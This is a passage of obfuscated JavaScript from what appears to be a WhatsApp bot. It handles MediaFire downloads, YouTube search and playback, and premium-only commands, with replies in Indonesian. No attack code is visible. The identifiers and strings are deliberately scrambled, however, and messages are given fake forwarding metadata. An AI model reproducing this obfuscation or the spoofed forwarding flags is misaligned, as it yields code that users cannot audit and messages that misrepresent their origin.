_0x439e7e(_0x570cb0,_0x26de0d,_0x47eb62,_0x2bb463){return _0x1e23e4(_0x570cb0-0x13b,_0x26de0d-0x1bb,_0x570cb0- -0x352,_0x47eb62);}function _0x4c0773(_0x2b6ece,_0x5efe27,_0x4ef703,_0x36170f){return _0x1e23e4(_0x2b6ece-0x19a,_0x5efe27-0x1ce,_0x5efe27-0x3c5,_0x2b6ece);}axios[_0x439e7e(0x4f,0x305,-0x211,-0x350)](_0x4c0773(0x2a7,0x6ee,0xa5b,0xb21)+_0x4c0773(0xa5f,0xa9e,0xb3a,0xad7)+_0x4c0773(0xc08,0xb12,0xe12,0xea3)+_0x4c0773(0xb58,0xd2b,0x115a,0x10e6)+_0x1db3bb)['then'](async _0x55e199=>{me='*Link*\x20:\x20'+_0x55e199[_0x52995a(0x45a,0x4e1,0x238,0x8e7)];function _0x286ce9(_0x70a767,_0x32c034,_0x488e76,_0x49f3b1){return _0x439e7e(_0x488e76-0xc6,_0x32c034-0x120,_0x70a767,_0x49f3b1-0x0);}wmm=await getBuffer(_0x1db3bb);const _0x439c8f={};_0x439c8f['mediaUrl']=_0x1fb701[_0x52995a(0x367,0x75f,0x84b,0x476)],_0x439c8f[_0x52995a(0x27f,0x664,0x4cf,0x4b3)]=0x2,_0x439c8f[_0x286ce9(0x36,0x160,0x4ee,0x468)]=_0x286ce9(-0x3aa,0x42d,0x39,-0x437)+_0x52995a(-0x1e9,-0x604,-0x23a,-0x111)+'k',_0x439c8f['body']='',_0x439c8f[_0x286ce9(0x861,0x6b6,0x748,0x34b)+'rl']='',_0x439c8f[_0x52995a(-0x84,0x40c,-0xa8,0x419)]=pp_userz;const _0x5b876a={};_0x5b876a[_0x286ce9(0xaa9,0x6ee,0x5a4,0x287)+'Score']=0x3b9aca00,_0x5b876a[_0x286ce9(0x927,0xbac,0x823,0x910)+'d']=!![],_0x5b876a[_0x52995a(-0x1ae,-0x3e3,-0x30c,-0x1e0)+_0x286ce9(0x217,-0x435,-0xa8,-0x1fb)]=!![],_0x5b876a[_0x52995a(0xe0,0x1c9,-0x277,-0x147)+_0x52995a(-0x1fa,0x149,-0x1e3,-0x1b3)]=_0x439c8f;const _0x3a510b={};_0x3a510b[_0x52995a(0x5d6,0x97a,0x8f8,0x498)+'o']=_0x5b876a,_0x3a510b['mimetype']=_0x1fb701[_0x286ce9(0x5e7,0x975,0x60b,0x150)],_0x3a510b[_0x286ce9(-0xb6,-0x2c6,0x104,-0x2d8)]=_0x52995a(0x7cd,0xc72,0xc5c,0xa96)+_0x52995a(0x26c,0x4fd,0x67b,0x230);function _0x52995a(_0x322139,_0x39fb80,_0x443977,_0x1143ea){return _0x439e7e(_0x322139-0x62,_0x39fb80-0x4f,_0x1143ea,_0x1143ea-0x32);}_0x3a510b[_0x52995a(0x4c3,0x581,0x839,0x50a)]=fgclink2,_0x3a510b[_0x286ce9(-0x323,-0x8c,-0x20,0x4a3)]=pp_userz,alpha[_0x52995a(0x395,0x5b5,-0x56,0x27f)+'e'](from,wmm,MessageType['document'],_0x3a510b);});})[_0x593f96(0xc8c,0xa4c,0x94c,0x8ec)](_0x1da5c0=>console['log'](_0x1da5c0)),await limitAdd(sender,limit);break;case _0x593f96(0x96a,0x8bf,0x844,0x5a1):const _0xf6162e={};_0xf6162e['displayTex'+'t']='Upgrade\x20Pr'+_0x1e23e4(0x89,0x3cd,0x534,0x4d7);const _0x78abe4={};_0x78abe4[_0x1e23e4(0x300,-0xd3,0x200,-0x10)]=_0x593f96(0xb76,0xcc2,0xa5b,0x7c7),_0x78abe4[_0x1e23e4(0xce,0x351,0xc6,0x3ed)]=_0xf6162e,_0x78abe4['type']=0x1;const _0x34df55={};_0x34df55['quoted']=mek;if(!isPremium)return sendButMessage(from,'Mohon\x20maaf'+_0x593f96(0x72c,0xb82,0xb3b,0x32b)+'\x20khusus\x20un'+_0x593f96(0x78a,0x49d,0x8a5,0x6e6)+'remium\x20saj'+_0x593f96(0x65e,0x28d,0x9a5,0x4f8)+_0x593f96(0xaff,0xcee,0xc7d,0x675)+_0x1e23e4(0x851,0x2d3,0x3d1,0x85c)+'ngan\x20cara\x20'+_0x1e23e4(0x5f4,0x5bc,0x4be,0x70f)+prefix+_0x1e23e4(0x84b,0x51e,0x998,0x906),_0x1e23e4(0x8f4,0x6fe,0x784,0xc20)+'on\x20below',[_0x78abe4],_0x34df55);if(args[_0x593f96(0xae8,0xb3c,0xee7,0xe02)]<0x30a*-0x7+-0x1*0x13b1+0x6d4*0x6)return reply('Link\x20Nya\x20M'+_0x593f96(0x73f,0x96e,0x5f7,0x9d7));if(!isUrl(args[-0x223c+0x24b+0x11*0x1e1])&&!args[0x518*-0x2+-0x7*0x511+0x2da7][_0x1e23e4(0x4da,0x6c4,0x764,0xa0d)](_0x1e23e4(0xa7b,0x93a,0x78c,0x7e3)))return reply(mess[_0x593f96(0x755,0x760,0x700,0x59f)]['Iv']);reply(lang[_0x593f96(0x321,0x79,0x6fd,0x813)]()),teks=args['join']('\x20'),res=await mediafireDl(teks),result=_0x593f96(0x831,0x3ea,0xc19,0x9f8)+_0x1e23e4(0x7bb,0x5ef,0x2ae,0x15d)+_0x593f96(0x4d7,0x6d8,0x348,0x37e)+petik+_0x1e23e4(0x46c,0xc00,0x72d,0x74c)+petik+'\x20'+res[-0x2458*0x1+0x622*-0x2+-0x22*-0x16e][_0x593f96(0x720,0x6f7,0x400,0x992)]+'\x0a'+petik+_0x593f96(0x33a,0x19f,0x565,0xef)+petik+'\x20'+res[0xccf+-0x3be+-0x911][_0x593f96(0x2d1,-0x37,0x726,0x317)]+'\x0a'+petik+_0x1e23e4(0x87e,0x704,0xaa6,0xf71)+petik+'\x20'+res[-0x1b8f+-0x2275*0x1+0x3*0x14ac][_0x593f96(0x6ce,0x3be,0x996,0x861)]+(_0x593f96(0x969,0xa46,0x8fd,0xab4)+'oading\x20fil'+_0x1e23e4(0x637,0x7ec,0x9b2,0xe61)),await reply(result),mdf=await getBuffer(res[0x619*-0x5+0x22ae+-0x431][_0x1e23e4(0x12c,-0x425,0xf3,-0x25b)]);const _0x547e4c={};_0x547e4c[_0x1e23e4(-0x67,0x4ba,0x10d,0x193)]='https://yo'+_0x1e23e4(0xb22,0xaf4,0x88b,0xc8c)+'xTH6oLd8',_0x547e4c['mediaType']=0x2,_0x547e4c[_0x593f96(0x958,0xb64,0xb89,0x669)]=_0x593f96(0x7cd,0x734,0x331,0xaaa)+_0x593f96(0xc55,0xc00,0xad1,0xda9),_0x547e4c[_0x1e23e4(0x55b,0x58a,0xde,0x2c2)]='',_0x547e4c[_0x1e23e4(0xc85,0xd9d,0x9d4,0x72e)+'rl']='',_0x547e4c['thumbnail']=pp_userz;const _0x342e60={};_0x342e60['forwarding'+'Score']=0x3b9aca00,_0x342e60['isForwarde'+'d']=!![],_0x342e60[_0x1e23e4(0x1ab,0x5cf,0x142,-0x2a5)+_0x593f96(0x3c2,0x7c1,-0x110,0x7e2)]=!![],_0x342e60[_0x593f96(0x5ae,0x603,0x4fe,0x8b5)+_0x1e23e4(0xf7,-0x3fc,0xf6,-0x1c6)]=_0x547e4c;const _0x4be29d={};_0x4be29d[_0x593f96(0xaa4,0x767,0x86f,0xa9f)+'o']=_0x342e60,_0x4be29d[_0x1e23e4(0x61a,0x476,0x8bb,0x808)]=res[-0x26b4+-0x25a6+0x4c5a][_0x1e23e4(0x9a1,0xcdc,0xa67,0xc13)],_0x4be29d[_0x593f96(0x56e,0x5ee,0x69,0x297)]=res[-0x2f5*-0x2+-0x2228*-0x1+-0x2812][_0x593f96(0x720,0x96e,0x9c3,0xb05)],_0x4be29d[_0x593f96(0x991,0x7bb,0x644,0x7d0)]=fgclink,_0x4be29d[_0x593f96(0x44a,0x619,0x19c,0x46b)]=pp_userz,alpha['sendMessag'+'e'](from,mdf,MessageType[_0x1e23e4(0x376,0x27b,0x475,0x56f)],_0x4be29d);break;case _0x593f96(0x605,0x219,0x9c6,0x1fe):if(args['length']===-0x3*-0x349+-0x881+-0x15a)return reply(_0x1e23e4(0xad1,0x65f,0x99a,0xb46)+_0x1e23e4(0x8ae,0xdd8,0x962,0x53c)+prefix+(_0x1e23e4(0x514,0x2b9,0x2f4,0x497)+_0x1e23e4(0x63e,0x796,0x9aa,0xd52)+_0x593f96(0x43f,0x333,0x686,-0x7b)+'dicari_'));var srch=args[_0x1e23e4(0x5a6,0x696,0xa51,0xf5d)]('');aramas=await yts(srch),server=_0x593f96(0x911,0x8fc,0x9eb,0x772),aramat=aramas[_0x593f96(0x68e,0xadb,0xa7b,0x246)];var mulaikah=aramat[0xaaf*-0x3+-0x187f+0x149*0x2c][_0x593f96(0x331,-0x1a8,0x209,0x50e)];try{ytv2(mulaikah,server)[_0x1e23e4(0x40b,0xa24,0x667,0x75d)](_0x14d503=>{const _0x531f44={'mlVbP':function(_0x55764a,_0x2ee10e){return _0x55764a(_0x2ee10e);},'RDIjM':function(_0x2b0e89,_0x2714fb){return _0x2b0e89!==_0x2714fb;},'LXxUs':_0x7a42eb(-0x18d,0x381,0x27,0x356),'QFvxi':function(_0x5beefc,_0x547db0){return _0x5beefc>=_0x547db0;},'AKseK':function(_0x12af78,_0x3add45){return _0x12af78(_0x3add45);},'hHlVS':function(_0x3ae10b,_0xb1772a,_0x5742b0,_0x4445bc){return _0x3ae10b(_0xb1772a,_0x5742b0,_0x4445bc);},'WUtud':function(_0x50fb3b,_0x22cc26,_0x1152f6,_0x4c6d97){return _0x50fb3b(_0x22cc26,_0x1152f6,_0x4c6d97);},'DvRAM':function(_0x45a348,_0x3c97ef,_0x5b1df8){return _0x45a348(_0x3c97ef,_0x5b1df8);}};function _0xfb338c(_0x46a49a,_0x559219,_0x56b5ee,_0x4198be){return _0x1e23e4(_0x46a49a-0xff,_0x559219-0x68,_0x46a49a-0x15f,_0x56b5ee);}function _0x7a42eb(_0x1ceb22,_0x21bc05,_0x16b85c,_0xff2b25){return _0x1e23e4(_0x1ceb22-0x18e,_0x21bc05-0x8f,_0x21bc05- -0x1a2,_0x1ceb22);}const {dl_link:_0x38982d,thumb:_0x36b9ef,title:_0x2a5f2,filesizeF:_0x1678d0,filesize:_0x625b23}=_0x14d503;axios[_0x7a42eb(-0x168,0x1ff,-0x17,0x5f4)](_0x7a42eb(0x113,0x187,0x669,-0x10a)+_0x7a42eb(0x5e6,0x537,0x479,0x66d)+_0x7a42eb(0xa9d,0x5ab,0x474,0xa56)+_0x7a42eb(0xa41,0x7c4,0x2e9,0xaa3)+_0x38982d)[_0xfb338c(0x7c6,0xbcf,0xc9c,0x5cd)](async _0x469d9a=>{function _0x398a95(_0x29f00a,_0x3c22ad,_0x5754ef,_0x51a6e6){return _0x7a42eb(_0x3c22ad,_0x5754ef-0x1b1,_0x5754ef-0xc6,_0x51a6e6-0x62);}function _0x4ae2c7(_0x4961d3,_0x2448cf,_0x24157e,_0x3947ef){return _0xfb338c(_0x24157e- -0x9a,_0x2448cf-0x1a4,_0x3947ef,_0x3947ef-0x193);}if(_0x531f44[_0x398a95(0x291,0x58b,0x349,0x166)](_0x531f44[_0x4ae2c7(0x667,0x3be,0x49d,0x468)],_0x531f44[_0x398a95(0x615,0xb7,0x3e7,0x2dc)]))_0x531f44[_0x398a95(0x51a,0x684,0x437,0x21f)](_0x186814,_0x10ab9b[_0x4ae2c7(0x74d,0x1d8,0x63c,0x3a8)]['api']);else{if(_0x531f44[_0x4ae2c7(0x63f,0x47f,0x363,0xa6)](_0x531f44[_0x4ae2c7(0xa01,0xe11,0x90b,0xc92)](Number,_0x625b23),-0x27*0x3c2+-0x2138*-0xe+0x481e))return _0x531f44[_0x4ae2c7(0x55d,0x607,0x8b8,0x4eb)](sendMediaURL,from,_0x36b9ef,_0x4ae2c7(0x198,0x8ee,0x596,0x5cb)+_0x398a95(0xa08,0x13b,0x538,0x248)+enter+enter+(_0x398a95(0x70f,0x6b7,0x5f3,0x3a0)+':\x20')+_0x2a5f2+enter+(_0x4ae2c7(0x90f,0x410,0x638,0x3c4)+_0x398a95(0xfc,0xdb,0x1bd,0x18c)+'s')+enter+('🦁\x20*Ext*\x20:\x20'+_0x398a95(0x810,0x491,0x427,0x5fc))+enter+(_0x398a95(0x796,0x8d0,0x5b2,0x663)+_0x398a95(0x8a5,0x99b,0x8f0,0xdd1))+_0x1678d0+enter+(_0x4ae2c7(0xd83,0xed2,0x9e8,0xb83)+'\x20')+_0x469d9a['data']+enter+enter+('_Untuk\x20dur'+_0x398a95(-0xe8,0x453,0x164,0x41)+_0x4ae2c7(0xb56,0xb4f,0xa92,0x5ed)+_0x4ae2c7(0xac9,0x935,0x99f,0x748)+'\x20dalam\x20ben'+_0x398a95(0xbdb,0xc22,0x9db,0xaa0)));const _0x818bd0=_0x398a95(0x3fc,0x7ae,0x4e0,0x47d)+_0x4ae2c7(0x5f9,0x5e7,0x5ee,0x49c)+enter+enter+(_0x4ae2c7(0x4f4,0x4ef,0x6a9,0x7ec)+':\x20')+_0x2a5f2+enter+(_0x398a95(0xa4,0x4fd,0x582,0x335)+_0x398a95(-0x23a,0x3be,0x1bd,0x5d0)+'s')+enter+(_0x398a95(0x7cf,0x425,0x6e6,0x798)+_0x4ae2c7(0x5f7,0x341,0x4dd,0x6c1))+enter+('🐭\x20*Filesiz'+'e*\x20:\x20')+_0x1678d0+enter+(_0x398a95(0xacb,0xb47,0x932,0x70d)+'\x20')+_0x469d9a[_0x398a95(0x989,0x3b4,0x759,0x96a)]+enter+enter+('_Silahkan\x20'+_0x398a95(0x571,0x509,0x4f2,0x940)+_0x4ae2c7(0x443,0x571,0x8f7,0x6e8)+_0x4ae2c7(0xe13,0xf2b,0xb3b,0x89e)+'im\x20mungkin'+_0x4ae2c7(0x5a9,-0x21e,0x215,0x28f)+_0x398a95(0x961,0x698,0x5ce,0x2b9)+'t_');_0x531f44[_0x4ae2c7(0x63b,-0x2c,0x38c,0x450)](sendMediaURL,from,_0x36b9ef,_0x818bd0),await _0x531f44[_0x398a95(0x62c,0x1e9,0x2bf,-0xe4)](sendMediaURL,from,_0x38982d)['catch'](()=>reply(_0x398a95(0x1f4,0x724,0x586,0x8b4)));}});});}catch(_0x1d217e){reply(mess[_0x593f96(0x755,0x46c,0x254,0x884)][_0x593f96(0xcc7,0xa93,0x974,0xf91)]);}await limitAdd(sender,limit);break;case _0x1e23e4(0x24,0xd5,0x319,0x6da):if(args[_0x1e23e4(0x4b4,0xad4,0x90a,0x5e5)]===-0x6aa+-0x96d+0x55d*0x3)return reply('Kirim\x20peri'+_0x1e23e4(0x5d7,0x5ff,0x962,0xbe4)+prefix+('video*\x20_Ju'+'dul\x20video\x20'+_0x1e23e4(0x49a,0x62f,0x261,-0x222)+'dicari_'));var srch=args[_0x593f96(0xc2f,0x10b0,0xb7a,0xf64)]('');aramas=await yts(srch),server=_0x1e23e4(0x8da,0xa32,0x733,0x5e0),aramat=aramas['all'];var mulaikah=aramat[-0x1632+0xa*0x398+-0xdbe]['url'];try{ytv3(mulaikah,server)[_0x593f96(0x845,0xb96,0x642,0x433)](_0x5d26e7=>{const _0xe5e1f3={'HWNrJ':_0x2e48be(0x33b,0x424,0x55f,0x315),'hpZMy':function(_0x38df6c,_0x4f2f40){return _0x38df6c>=_0x4f2f40;},'oxqkd':function(_0x118044,_0x5e3a37){return _0x118044(_0x5e3a37);},'ztUHn':function(_0x29059f,_0x196b76){return _0x29059f!==_0x196b76;},'GQFHr':_0x2e48be(0x2d7,0x33b,0x5f3,0x599),'oyvkO':_0x2e48be(0xe78,0xa3a,0x5b5,0x610),'yRPRG':function(_0x2851ed,_0x29cea2,_0x3e56ff,_0x3ca4c9){return _0x2851ed(_0x29cea2,_0x3e56ff,_0x3ca4c9);}};function _0x2e48be(_0x5adbfb,_0x21c10c,_0x262410,_0x582446){return _0x1e23e4(_0x5adbfb-0x39,_0x21c10c-0xb5,_0x21c10c-0x7a,_0x262410);}function _0x8f4366(_0x459b67,_0x2f9d21,_0x3fc304,_0x21d485){return _0x593f96(_0x21d485-0xca,_0x2f9d21,_0x3fc304-0x1b7,_0x21d485-0x37);}const {dl_link:_0x42ba6b,thumb:_0x4c6129,title:_0x4a050e,filesizeF:_0x2d9cf6,filesize:_0x253eaf}=_0x5d26e7;axios['get']('https://ti'+_0x8f4366(0x785,0x676,0xe64,0x981)+_0x8f4366(0xd7b,0x75a,0xa66,0x9f5)+'.php?url='+_0x42ba6b)[_0x2e48be(0x693,0x6e1,0xbac,0xa04)](async _0x7f568b=>{function _0x5a8727(_0x27d2f8,_0x50ac13,_0x24ba6c,_0x208a52){return _0x8f4366(_0x27d2f8-0xb4,_0x27d2f8,_0x24ba6c-0x71,_0x24ba6c-0x136);}function _0x1bf18e(_0x59d234,_0xa8e606,_0x19f7c2,_0x5d0945){return _0x8f4366(_0x59d234-0xca,_0x59d234,_0x19f7c2-0xa,_0xa8e606- -0x4e9);}const _0x248fbc={'LbqnC':function(_0x4b69bd,_0x4fcf49){function _0x5f4c69(_0xcf4c8b,_0x40d5a1,_0x35ab8f,_0x3191f6){return _0x1511(_0x35ab8f-0x31,_0xcf4c8b);}return _0xe5e1f3[_0x5f4c69(0x30d,0x418,0x19c,0x2d8)](_0x4b69bd,_0x4fcf49);},'wrmUH':function(_0x4b9d6a,_0x22d428){function _0x5b1200(_0x58cceb,_0x1cce1e,_0x426189,_0x516f7d){return _0x1511(_0x1cce1e- -0x291,_0x516f7d);}return _0xe5e1f3[_0x5b1200(0x4f7,0x6f1,0x8e7,0x546)](_0x4b9d6a,_0x22d428);},'AeAqs':function(_0x330d10,_0x275294,_0x418e6b,_0x583a1f){return _0x330d10(_0x275294,_0x418e6b,_0x583a1f);}};if(_0xe5e1f3['ztUHn'](_0xe5e1f3[_0x5a8727(0xc9f,0xb5b,0xda6,0xd6f)],_0xe5e1f3['oyvkO'])){if(_0xe5e1f3[_0x1bf18e(0x6e4,0x747,0x6ee,0x502)](Number,_0x253eaf)>=0x2*0x10975+0x14dc3+0x1*-0x1da0d)return _0xe5e1f3[_0x1bf18e(0x62b,0x386,0x16f,0x310)](sendMediaURL,from,_0x4c6129,_0x5a8727(0xdc7,0xa65,0x8af,0x8e4)+_0x1bf18e(0x40a,0x2e8,-0x156,0x74d)+enter+enter+(_0x1bf18e(0x4c4,0x3a3,0x7e5,0x78d)+':\x20')+_0x4a050e+enter+(_0x1bf18e(0x72b,0x332,0x340,-0xc3)+_0x1bf18e(-0x484,-0x93,-0x30,-0x33c)+'s')+enter+(_0x1bf18e(-0x47,0x496,0x724,0x4bf)+_0x5a8727(0x45c,0xaa2,0x7f6,0xbb2))+enter+(_0x5a8727(0x676,0x58c,0x981,0x467)+_0x5a8727(0x937,0x912,0xcbf,0x10dc))+_0x2d9cf6+enter+('🐺\x20*Link*\x20:'+'\x20')+_0x7f568b[_0x1bf18e(0x374,0x509,0x422,0x924)]+enter+enter+(_0x1bf18e(0x3d7,0x1c2,-0x178,0x1cc)+'asi\x20lebih\x20'+_0x1bf18e(0x604,0x78c,0x2e2,0xbc7)+_0x1bf18e(0x1f4,0x699,0x9bd,0x9ba)+_0x5a8727(0x1267,0x8a4,0xd89,0x1248)+_0x1bf18e(0xace,0x78b,0x3a2,0x6a7)));const _0x285d8e=_0x5a8727(0xa3e,0xd55,0x8af,0x6af)+_0x1bf18e(0x19a,0x2e8,0x39e,0x3b3)+enter+enter+(_0x1bf18e(0x403,0x3a3,0x410,0x41d)+':\x20')+_0x4a050e+enter+(_0x5a8727(0x91e,0x45d,0x951,0x47c)+_0x5a8727(0x80f,0x8fd,0x58c,0x1a2)+'s')+enter+(_0x5a8727(0x88d,0xd79,0xab5,0xcec)+_0x5a8727(0x34a,0x343,0x7f6,0x841))+enter+(_0x1bf18e(0x43c,0x362,0x56a,0x709)+_0x1bf18e(0x763,0x6a0,0xab7,0x31d))+_0x2d9cf6+enter+(_0x5a8727(0x1098,0x82c,0xd01,0x116a)+'\x20')+_0x7f568b[_0x1bf18e(0x59e,0x509,0x932,0x99)]+enter+enter+(_0x1bf18e(0x4b4,0x744,0x39e,0xc38)+_0x1bf18e(0x1d5,0x2a2,0x240,0x761)+'e\x20media\x20se'+_0x1bf18e(0x75f,0x835,0x80d,0x768)+_0x1bf18e(0x4a0,0x1c7,0x2a2,0x3e1)+_0x5a8727(0x394,0x86f,0x52e,0x52)+_0x1bf18e(0x68a,0x37e,0x373,0x885)+'t_');_0xe5e1f3[_0x1bf18e(-0x49,0x386,0x1ac,-0x5e)](sendMediaURL,from,_0x4c6129,_0x285d8e),await sendMediaURL(from,_0x42ba6b)['catch'](()=>reply(_0x5a8727(0x7ea,0x6cf,0x955,0x6f1)));}else{const _0x1c4c86={};_0x1c4c86['HrYUZ']=_0xe5e1f3[_0x5a8727(0xe03,0xee3,0xe37,0x1290)];const _0x4b700f=_0x1c4c86,{dl_link:_0x154a72,thumb:_0x22e54d,title:_0x4a5786,filesizeF:_0x51d86e,filesize:_0x48d91b}=_0x2cba10;_0x41b00c[_0x1bf18e(0x15a,0x160,0x4,0x5a6)](_0x5a8727(0x33d,0xb17,0x707,0x7fd)+_0x1bf18e(0xa0,0x498,0x8ab,0x860)+_0x1bf18e(0x9be,0x50c,0x147,0x27c)+_0x5a8727(0x10da,0xc76,0xd44,0xb18)+_0x154a72)[_0x5a8727(0xf41,0x8fd,0xa45,0x923)](async _0x5e9b40=>{if(_0x248fbc[_0x4d6607(-0x744,-0x23e,-0x4a3,-0x1f5)](_0x248fbc[_0x2420e3(0x360,0x138,0x3f9,0x111)](_0x4582c8,_0x48d91b),0x15f4a+-0x11397+-0x1*-0x13aed))return _0x248fbc[_0x2420e3(0x42f,0x95a,0x5f7,0x847)](_0x9d72,_0xd8b547,_0x22e54d,'*📽️\x20YOUTUBE'+'-PLAY\x20MP4*'+_0x182b51+_0x47adf3+(_0x4d6607(0x9d,-0xc0,-0x2f6,0x68)+'*\x20')+_0x4a5786+_0x1ffd3c+(_0x4d6607(0x27,0x26b,0x21d,0xcc)+'\x20:*\x201080kb'+'ps')+_0x58730e+(_0x4d6607(-0x73,0x3cf,0x2b8,0x6f9)+_0x2420e3(0x382,0x385,0x337,0x573))+_0x22c6eb+(_0x2420e3(-0x28,0x44e,0x4c2,0x512)+_0x4d6607(0x9ce,0x5d9,0x80f,0x8db))+_0x51d86e+_0x29d894+('🐺\x20*Link*\x20:'+'\x20')+_0x5e9b40[_0x4d6607(0x305,0x442,0x7bd,0x327)]+_0x485054+_0x1ac3fc+('_Untuk\x20dur'+'asi\x20lebih\x20'+_0x2420e3(0x85e,0x9e9,0x8ec,0x4b5)+'\x20disajikan'+_0x2420e3(0x7a9,0xab3,0x8ca,0xc90)+'tuk\x20link_'));function _0x4d6607(_0x22ad26,_0x1dd83a,_0xcff87e,_0x25cfd9){return _0x1bf18e(_0xcff87e,_0x1dd83a- -0xc7,_0xcff87e-0x10d,_0x25cfd9-0xf0);}function _0x2420e3(_0x19f125,_0x2db761,_0x5e42a5,_0xdc90d9){return _0x5a8727(_0xdc90d9,_0x2db761-0x1bf,_0x5e42a5- -0x4bf,_0xdc90d9-0x1b1);}_0x366863(_0x214a70,_0x154a72,'')[_0x2420e3(0xcde,0xd49,0x9cd,0xdb3)](_0xa7bb1=>{function _0x200a3f(_0x197749,_0x538b43,_0x345ae4,_0x3e334e){return _0x2420e3(_0x197749-0x1db,_0x538b43-0x52,_0x345ae4-0x5d,_0x3e334e);}_0x4eb82e(_0x4b700f[_0x200a3f(0x7cd,0x124,0x3c1,0xc6)]);});});}});});}catch(_0x292656){reply(mess[_0x593f96(0x755,0x6f6,0x6d4,0x951)][_0x593f96(0xcc7,0xa61,0x1134,0xf81)]);}await limitAdd(sender,limit);break;case _0x593f96(0xc53,0xdbe,0x9dc,0xec3):if(args['length']===0x897+-0x2*-0x8a9+0xb*-0x25b)return reply('Kirim\x20peri'+'ntah\x20*'+prefix+(_0x1e23e4(-0x97,-0x137,0x3a6,-0x14f)+_0x1e23e4(0x7c2,0xb27,0xa2b,0xc34)));let isLinks2=args[0x1775+-0x19f2+0x27d][_0x593f96(0x2af,-0x88,0x574,0x3fc)](/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);if(!isLinks2)return reply(mess[_0x593f96(0x755,0x751,0x53c,0x82c)]['Iv']);server=_0x593f96(0x911,0x900,0xc82,0xc96);try{let yut=await yts(args[0xe70+0x24cd+0xd*-0x3f1]);reply(lang['wait']()),ytv2(args[0x519+0x2688+-0xdb*0x33],server)[_0x1e23e4(0x3bf,0xb7a,0x667,0x4a5)](_0x7a07d8=>{function _0x8ddf9e(_0x151221,_0x521369,_0x46b682,_0x1ea81d){return _0x593f96(_0x46b682- -0x585,_0x1ea81d,_0x46b682-0xd2,_0x1ea81d-0x8c);}const _0x449ae4={'jfpZv':function(_0x235b7a,_0x8a470b){return _0x235b7a>=_0x8a470b;},'pJweB':function(_0x27622e,_0x1c4430,_0x555576,_0x324ecb){return _0x27622e(_0x1c4430,_0x555576,_0x324ecb);},'Szcyp':function(_0x188e47,_0x214592){return _0x188e47(_0x214592);},'wVKQB':_0x8ddf9e(-0x71b,0x17b,-0x23e,0x225)+'0kbps)','oAMxE':_0x8ddf9e(0x2d0,0x72f,0x3d4,0x462),'yTItM':'Video\x20(480'+_0x8ddf9e(0x7e6,0xb2b,0x741,0x3dc),'QyQzU':function(_0x7f3060,_0x3eaa92,_0x4ca2cf,_0x449a02,_0x1e5f2a,_0x5045e1,_0xc2c38e){return _0x7f3060(_0x3eaa92,_0x4ca2cf,_0x449a02,_0x1e5f2a,_0x5045e1,_0xc2c38e);}};function _0x25c4ad(_0x384d32,_0x4f0976,_0x109001,_0x3edf6d){return _0x1e23e4(_0x384d32-0x1f4,_0x4f0976-0x7,_0x384d32- -0x242,_0x3edf6d);}const {dl_link:_0x57dcd2,thumb:_0x29df88,title:_0x19c8bf,filesizeF:_0x3bbf4f,filesize:_0xf6a6dc}=_0x7a07d8;axios[_0x8ddf9e(0x2f6,-0x45e,-0x6,0xfd)](_0x25c4ad(0xe7,0xc4,-0x25e,-0x76)+_0x8ddf9e(0x627,-0x134,0x332,0x4cb)+_0x25c4ad(0x50b,0x9d4,0x272,0x44b)+_0x8ddf9e(0x7f2,0x3c6,0x5bf,0x7c2)+_0x57dcd2)[_0x8ddf9e(0x54e,0x52b,0x2c0,-0x1d)](async _0x1b73ea=>{if(_0x449ae4[_0x72a199(0x740,0x998,0x6f4,0x4cf)](Number(_0xf6a6dc),-0xfb*-0x83+0x575f*-0x1+0x732e*0x1))return _0x449ae4[_0x72a199(0x6b0,0x2f4,0x636,0x436)](sendMediaURL,from,_0x29df88,_0x72a199(0x37b,0x9dc,0x639,0x86a)+_0x72a199(0xd4e,0x8ec,0x86a,0xd30)+_0x72a199(0x4a8,-0x139,0x35a,-0x1a2)+enter+enter+('🐣*Title\x20:*'+'\x20')+_0x19c8bf+enter+(_0x900b9e(0x8a3,0x53f,0x9fd,0xca8)+_0x900b9e(0x4e8,0x368,0x735,0x1d4))+enter+(_0x900b9e(0x72b,0x8ed,0x4c3,0x632)+_0x900b9e(0x1d5,-0x277,0x103,-0x137))+_0x3bbf4f+enter+('🦡\x20*Link\x20:*'+'\x20')+_0x1b73ea[_0x72a199(0xd14,0x64c,0x805,0x8c9)]+enter+enter+(_0x72a199(0x918,0x78a,0x4be,0x78c)+'asi\x20lebih\x20'+_0x900b9e(0xa9d,0x7e4,0xacd,0x65c)+'\x20disajikan'+_0x900b9e(0xa7b,0xdce,0x91f,0xf87)+_0x900b9e(0xa9c,0xf23,0xef4,0x604)));const _0xa886ed=_0x900b9e(0x484,0x397,0x816,0x8b)+_0x72a199(0x571,0x2d8,0x67f,0x3e2)+'\x09\x09\x09\x0a💦\x20Titl'+_0x900b9e(0x812,0x6d6,0x9fb,0xc59)+_0x19c8bf+(_0x900b9e(0x46e,0x84c,0x964,0x59b)+'P4\x0a🤠\x20ID\x20:\x20')+yut[_0x900b9e(0x2a0,0x1f8,0x425,0x36f)][0x98d+-0x6b*-0x3d+-0x230c*0x1][_0x900b9e(0x620,0x861,0x439,0xb18)]+(_0x72a199(0x688,0x5db,0x2e6,0x61)+':\x20')+yut[_0x72a199(0x658,0x363,0x28b,0x5f4)][-0x12e*-0x2+0x1e1a+0x33f*-0xa][_0x900b9e(0x473,0x74a,0x858,0x144)]+(_0x72a199(-0x11b,0x1a6,0x292,0x6ac)+'\x20')+_0xf6a6dc+(_0x72a199(0x502,0x711,0x44d,0x3e6)+':\x20')+yut[_0x72a199(0x636,0x530,0x28b,0x3e0)][-0x14d8+-0x2255+0x7d*0x71][_0x72a199(0x64f,0xc68,0x877,0xc25)]+('\x20\x0a🐣\x20Durati'+'on\x20:\x20')+yut[_0x72a199(0x4d2,0x790,0x28b,-0xea)][0x1032+0x25ce+-0x3600]['timestamp']+_0x900b9e(0x3d1,0x6aa,0x69c,0x829)+yut[_0x900b9e(0x2a0,0x1f1,0x214,0x179)][-0x1b06+-0x1480+0x2f86][_0x900b9e(0x223,0x206,0x1a3,0x739)];let _0xaaaa3d=await _0x449ae4['Szcyp'](getBuffer,_0x29df88);const _0x56ef02={};_0x56ef02['displayTex'+'t']=_0x449ae4['wVKQB'];const _0x2b21c4={};_0x2b21c4[_0x72a199(0x602,0x2cf,0x2bb,0x3d4)]='ytmp4ajafh'+'d\x20'+args[-0xc5f+0xa*0x38b+0x1*-0x170f],_0x2b21c4[_0x900b9e(0x196,0x505,0x461,-0x2dc)]=_0x56ef02,_0x2b21c4[_0x900b9e(0xa70,0x939,0xd45,0xcd1)]=_0x449ae4[_0x900b9e(0x802,0x4c5,0x8ab,0x764)];const 